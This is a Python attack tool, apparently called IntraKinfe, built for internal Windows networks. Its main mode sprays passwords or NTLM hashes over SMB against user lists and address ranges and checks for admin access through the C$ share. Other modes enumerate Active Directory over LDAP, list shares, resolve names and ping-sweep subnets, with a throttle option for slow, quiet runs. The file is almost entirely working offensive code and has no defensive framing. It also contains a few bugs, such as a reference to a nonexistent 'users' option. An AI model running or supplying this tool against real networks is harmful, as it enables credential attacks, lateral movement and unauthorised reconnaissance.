from impacket.smbconnection import SMBConnection
from ldap3 import Server, Connection, ALL, NTLM
import argparse
import socket
import sys
import threading
import time
import queue
import os

# global var
password = ''
nthash = ''
mode = ''
username = ''
time_sec = ''
timeout = ''
check = False

# parse cidr
def stringxor(str1, str2):
    orxstr = ""
    for i in range(0, len(str1)):
        rst = int(str1[i]) & int(str2[i])
        orxstr = orxstr + str(rst)
    return orxstr

def bin2dec(string_num):
    return str(int(string_num, 2)) 

def getip(ip, type):
    result = ''
    for i in range(4):
        item = bin2dec(ip[0:8])
        if i == 3:
            if type == 0:
                item = str(int(item) + 1)
            else:
                item = str(int(item) - 1)
        result = result + item + '.'
        ip = ip[8:]
    return result.strip('.') 

def CIDR(input):
    try:
        ip = input.split('/')[0]
        pos = int(input.split('/')[1])
        ipstr = ''
        for i in ip.split('.'):
            ipstr = ipstr + bin(int(i)).replace('0b', '').zfill(8)
        pstr = '1' * pos + '0' * (32 - pos)
        res = stringxor(ipstr, pstr)
        _ip = getip(res, 0), getip(res[0:pos] + '1' * (32 - pos), 1)
        return _ip[0] + "-" + _ip[1]
    except:
        return input

def get_ip_list(ip):
    ip_list_tmp = []
    iptonum = lambda x: sum([256 ** j * int(i) for j, i in enumerate(x.split('.')[::-1])])
    numtoip = lambda x: '.'.join([str(x / (256 ** i) % 256) for i in range(3, -1, -1)])
    if '-' in ip:
        ip_range = ip.split('-')
        ip_start = int(iptonum(ip_range[0]))
        ip_end = int(iptonum(ip_range[1]))
        ip_count = ip_end - ip_start
        if ip_count >= 0 and ip_count <= 655360:
            for ip_num in range(ip_start, ip_end + 1):
                ip_list_tmp.append(numtoip(ip_num))
        else:
            print('[-] wrong ip format...')
            sys.exit(1)
    else:
        ip_split = ip.split('.')
        net = len(ip_split)
        if net == 2:
            for b in range(1, 255):
                for c in range(1, 255):
                    ip = "%s.%s.%d.%d" % (ip_split[0], ip_split[1], b, c)
                    ip_list_tmp.append(ip)
        elif net == 3:
            for c in range(1, 255):
                ip = "%s.%s.%s.%d" % (ip_split[0], ip_split[1], ip_split[2], c)
                ip_list_tmp.append(ip)
        elif net == 4:
            ip_list_tmp.append(ip)
        else:
            print('[-] wrong ip format...')
            sys.exit(1)
    for i in range(len(ip_list_tmp)):
        ip_list_tmp[i] = ip_list_tmp[i].split('.')[0]+'.'+ip_list_tmp[i].split('.')[2]+'.'+ip_list_tmp[i].split('.')[4]+'.'+ip_list_tmp[i].split('.')[6]
    return ip_list_tmp

# hash spray
def spray(username, password, nthash, target_ip, check, time_out, port=445):
    if '\\' in username:
        domain = username.split('\\')[0]
        username = username.split('\\')[1]
    else:
        domain = ''
    #print(username+' '+domain+' '+password+' '+nthash)
    try:
        smbClient = SMBConnection(target_ip, target_ip, sess_port=int(port), timeout=int(time_out))
        smbClient.login(username, password=password, domain=domain, nthash=nthash)
        if check:
            try:
                smbClient.connectTree('c$')
                print('[+] {0} / user:{1}, password:{2}, hash:{3};  ....... Admin!'.format(target_ip,username,password,nthash))
            except:
                print('[+] {0} / user:{1}, password:{2}, hash:{3}'.format(target_ip,username,password,nthash))
        #SMBConnection.close
        else:
            print('[+] {0} / user:{1}, password:{2}, hash:{3}'.format(target_ip,username,password,nthash))
        SMBConnection.close
        return True
    except Exception as e:
        #print('[-] {} seems error...'.format(target_ip))
        return False
    
# adinfo search
def adinfo(username,password,target_ip,domain,filter,attr):
    server = Server(target_ip, get_info=ALL)
    dn = ''
    for n in domain.split('.'):
        dn = dn + 'dc={},'.format(n)
    dn = dn[:-1]
    try:
        conn = Connection(server, user=username, password=password, auto_bind=True, authentication=NTLM)
        conn.search(dn, search_filter="(objectclass={})".format(filter), attributes=[attr])
    except:
        print('[-] search error...')
        sys.exit(1)
    for i in conn.response:
        if 'attributes' in i:
            for n in i['attributes']:
                #print(n+' : ' + ''.join(i['attributes'][n])+'\n')
                try:
                    print(n+' : ' + str(i['attributes'][n]))
                except:
                    try:
                        print(n+' : ' + ','.join(i['attributes'][n]))
                    except:
                        print(n+' : ' + '???')
            print('\n')

# list share folder
def list_share(username,password,nthash,target_ip):
    if '\\' in username:
        domain = username.split('\\')[0]
        username = username.split('\\')[1]
    else:
        domain = ''
    try:
        smbClient = SMBConnection(target_ip, target_ip, sess_port=445)
        smbClient.login(username, password=password, domain=domain, nthash=nthash)
        shares = []
        resp = smbClient.listShares()
        for i in range(len(resp)):
            shares.append(resp[i]['shi1_netname'][:-1])
        print('[+] '+target_ip+': '+', '.join(shares))
    except:
        print('[-] '+target_ip+': '+'error...')
        sys.exit(1)


# parse dns
def domain2ip(target_ip):
        try:
            print('[+] '+target_ip+': '+socket.gethostbyname(target_ip))
        except:
            print('[-] '+target_ip+': error...')

# find alive
def findalive(target_ip):
    try:
        a = os.popen('ping -n 1 {}'.format(target_ip))
        res = a.read()
        if 'TTL=' in res:
            print('[+] {} is alive'.format(target_ip))
    except:
        print('[-] {} error'.format(target_ip))
    
# mutli threading
class MyThread(threading.Thread):
    def __init__(self, func):
        threading.Thread.__init__(self)
        self.func = func
    def run(self):
        self.func()

def worker():
    global mode,username,nthash,password,check,sec,time_sec,timeout
    if mode == 'spray':
        while not q.empty():
            (target_ip,user) = q.get()
            #i = num - q.qsize()
            spray(user, password, nthash, target_ip, check, timeout)
            time.sleep(int(time_sec))
    elif mode == 'share':
        while not q.empty():
            target_ip = q.get()
            #i = num - q.qsize()
            list_share(username, password, nthash, target_ip)
            time.sleep(int(time_sec))
    elif mode == 'dns':
        while not q.empty():
            target_ip = q.get()
            #i = num - q.qsize()
            domain2ip(target_ip)
            time.sleep(int(time_sec))
    elif mode == 'active':
        while not q.empty():
            target_ip = q.get()
            #i = num - q.qsize()
            findalive(target_ip)
            time.sleep(int(time_sec))
    else:
        sys.exit(1)

def start_thread(num):
    threads = []
    for m in range(int(num)):  
        thread = MyThread(worker)
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

# main function
def main():
    parser = argparse.ArgumentParser(add_help = True, description = "IntraKinfe: it's an amazing intranet tool")
    parser.add_argument('-m', action='store', dest = "mode", help='mode u want to use: [ spray|adinfo|share|dns|active ]')
    parser.add_argument('-U', action='store', dest = "userlist", help='List of users to spray')
    parser.add_argument('-u', action='store', dest = "user", help='point the username')
    parser.add_argument('-P', action='store', dest = "password", help='clear words password')
    parser.add_argument('-ha', action='store', dest = "hashes", help='LM:NTLM')
    parser.add_argument('-A', action='store_true', dest = "check", help='check if the user is admin')
    parser.add_argument('-l', action='store', dest = "computerlist", help='Computer_list')
    parser.add_argument('-a', action='store', default='*', dest = "attr", help='point the attributes,such as: "samaccountname,pwdlastset,admincount,mail"')
    parser.add_argument('-c', action='store', dest = "cidr", help='cidr,maybe x.x.x.x/24')
    parser.add_argument('-p', action='store', default='445', dest = "port", help='target_port')
    parser.add_argument('-t', action='store', default='20', dest = "thread", help='threading num')
    parser.add_argument('-d', action='store', dest = "dc_ip", help='dc ip for adinfo query')
    parser.add_argument('-T', action='store', default='1', dest = "wait", help='time sec,maybe u want to exec slowly ?')
    parser.add_argument('-codec', action='store', default='utf-8', dest = "codec", help='point the codec')
    parser.add_argument('-dm', action='store', dest = "Domain", help='domain name')
    parser.add_argument('-f', action='store', dest = "filter", help='filter for adinfo query: [ user|computer|group ]')
    parser.add_argument('--timeout', action='store', default='15', dest = "time_out", help='time out to set while connecting by smb')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)
    options = parser.parse_args()

    global mode,username,nthash,password,check,time_sec,timeout
    mode = options.mode
    timeout = options.time_out
    num = options.thread
    time_sec = options.wait
    print('[*] starting u game...')
    # spray hash
    if options.mode == 'spray':
        if (options.password is None and options.hashes is None) or (options.computerlist is None and options.cidr is None) or (options.userlist is None and options.user is None):
            parser.print_help()
            sys.exit(1)
        if (options.computerlist is not None and options.cidr is not None) or (options.userlist is None and options.user is None):
            parser.print_help()
            sys.exit(1)
        if options.password is None:
            nthash = options.hashes
        if options.hashes is None:
            password = options.password
        if options.check:
            check = True
        coms = []
        if options.computerlist is not None:
            for ip in open(options.computerlist,'r').readlines():
                coms.append(ip.strip())
        if options.cidr is not None:
            for ip in get_ip_list(CIDR(options.cidr)):
                coms.append(ip.strip())
        if options.userlist is not None:
            for ip in coms:
                for user in open(options.userlist,'r').readlines():
                    q.put((ip.strip(),user.strip()))
        if options.user is not None:
            for ip in coms:
                q.put((ip.strip(),options.user))
        start_thread(num)

    # search adinfo       
    elif options.mode == 'adinfo':
        if options.user is None or options.password is None or options.dc_ip is None or options.Domain is None or options.filter is None:
            parser.print_help()
            sys.exit(1)
        adinfo(options.user,options.password,options.dc_ip,options.Domain,options.filter,options.attr)

    # list share
    elif options.mode == 'share':
        if options.computerlist is None:
            parser.print_help()
            sys.exit(1)
        if options.password is not None:
            password = options.password
        if options.hashes is not None:
            nthash = options.hashes
        if options.users is not None:
            username = options.user
        for ip in open(options.computerlist,'r').readlines():
            q.put(ip.strip())
        start_thread(num)
    
    # parse dns and find active
    elif options.mode == 'dns':
        if options.computerlist is None:
            parser.print_help()
            sys.exit(1)
        for ip in open(options.computerlist,'r').readlines():
            q.put(ip.strip())
        start_thread(num)
    
    elif options.mode == 'active':
        if (options.computerlist is None and options.cidr is None) or (options.computerlist is not None and options.cidr is not None):
            parser.print_help()
            sys.exit(1)
        if options.computerlist is not None:
            for ip in open(options.computerlist,'r').readlines():
                q.put(ip.strip())
        if options.cidr is not None:
            for ip in get_ip_list(CIDR(options.cidr)):
                q.put(ip.strip())

        start_thread(num)
        # x.x.x.x/24
        print('[+] over ^o^')

    else:
        print('[-] wrong mode...')
        parser.print_help()
        sys.exit(1)


if __name__ == '__main__':
    q = queue.Queue()
    main()
